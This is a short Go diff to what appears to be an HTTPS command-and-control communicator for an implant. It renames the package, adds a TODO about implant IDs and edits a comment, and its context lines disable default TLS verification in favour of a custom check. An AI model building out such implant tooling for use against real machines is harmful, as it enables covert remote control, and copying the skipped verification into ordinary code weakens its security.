@@ -1,4 +1,4 @@
-package main
+package c2communicator
 
 import (
 	"bytes"
@@ -18,6 +18,7 @@ type HTTPSC2TaskRequest struct {
 	Options  map[string]interface{} `json:"options"`
 }
 
+// TODO: store ImplantID in HTTPSC2Communicator + DNSC2Communicator (after registration?)
 type HTTPSC2Communicator struct {
 	// Endpoints? #TODO
 	// URI? #TODO
@@ -33,7 +34,7 @@ func NewHTTPSC2Communicator() *HTTPSC2Communicator {
 		InsecureSkipVerify: true, // Disable default verification
 		VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
 			print("Verifying certificate...\n")
-			// Extract the public key from the server's certificate
+			// Extract the public key from the SERVER's certificate
 			cert, err := x509.ParseCertificate(rawCerts[0])
 			if err != nil {
 				return err
